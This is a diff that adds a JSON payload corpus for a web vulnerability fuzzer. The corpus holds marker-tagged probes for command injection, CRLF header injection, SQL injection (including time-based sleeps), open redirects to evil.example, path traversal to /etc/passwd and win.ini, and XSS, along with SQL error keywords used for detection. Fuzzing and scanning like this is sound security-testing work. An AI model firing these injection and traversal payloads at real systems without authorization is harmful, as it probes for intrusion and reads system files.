@@ -1,0 +1,123 @@
+{
+  "_note": "brain-fuzz-v1 payload corpus. {M} is replaced with the run marker (fixed per fuzz run, e.g. FUZZ290CT). Every payload is single-purpose; detection rules live in brain-fuzz-v1.py (triage table). Markers make every hit attributable to exactly one payload \u2014 no guessing which payload worked.",
+  "cmdi": [
+    {
+      "name": "cmdi_semi",
+      "payload": "; echo {M}C1"
+    },
+    {
+      "name": "cmdi_pipe",
+      "payload": "| echo {M}C2"
+    },
+    {
+      "name": "cmdi_and",
+      "payload": "&& echo {M}C3"
+    },
+    {
+      "name": "cmdi_backtick",
+      "payload": "`echo {M}C4`"
+    }
+  ],
+  "header": [
+    {
+      "name": "crlf_inject",
+      "payload": "x%0d%0aX-Fuzz-{M}H1: injected"
+    }
+  ],
+  "oracle": [
+    {
+      "name": "oracle_true",
+      "payload": "1' AND '1'='1' -- {M}O1"
+    },
+    {
+      "name": "oracle_false",
+      "payload": "1' AND '1'='2' -- {M}O2"
+    }
+  ],
+  "passwd_signature": "root:x:0:0",
+  "redirect": [
+    {
+      "name": "openredir_evil",
+      "payload": "https://evil.example/{M}R1"
+    },
+    {
+      "name": "openredir_proto",
+      "payload": "//evil.example/{M}R2"
+    }
+  ],
+  "sqli": [
+    {
+      "name": "sqli_union",
+      "payload": "1' UNION SELECT null,null-- {M}S1"
+    },
+    {
+      "name": "sqli_tautology",
+      "payload": "' OR '1'='1' -- {M}S2"
+    },
+    {
+      "name": "sqli_error_probe",
+      "payload": "'{M}S3'\""
+    },
+    {
+      "name": "sqli_stacked",
+      "payload": "1;SELECT '{M}S4'-- "
+    }
+  ],
+  "sqli_error_keywords": [
+    "you have an error in your sql syntax",
+    "mysql_fetch",
+    "mysql_num_rows",
+    "odbc_exec",
+    "pg_query",
+    "sqlite3::query",
+    "warning: pg_",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "sqlstate",
+    "ora-01756",
+    "microsoft ole db provider"
+  ],
+  "time": [
+    {
+      "name": "time_mysql",
+      "payload": "1' AND SLEEP(5)-- {M}T1"
+    },
+    {
+      "name": "time_pg",
+      "payload": "1';SELECT pg_sleep(5)-- {M}T2"
+    }
+  ],
+  "traversal": [
+    {
+      "name": "lfi_unix",
+      "payload": "../../../../../../etc/passwd{M}L1"
+    },
+    {
+      "name": "lfi_abs",
+      "payload": "/etc/passwd{M}L2"
+    },
+    {
+      "name": "lfi_win",
+      "payload": "..\\..\\..\\..\\windows\\win.ini{M}L3"
+    }
+  ],
+  "winini_signature": "[fonts]",
+  "xss": [
+    {
+      "name": "xss_attr_break",
+      "payload": "\"><svg onload=alert('{M}X1')>"
+    },
+    {
+      "name": "xss_script_block",
+      "payload": "<script>alert('{M}X2')</script>"
+    },
+    {
+      "name": "xss_img_onerror",
+      "payload": "<img src=x onerror=alert('{M}X3')>"
+    },
+    {
+      "name": "xss_plain_marker",
+      "payload": "{M}X4"
+    }
+  ]
+}
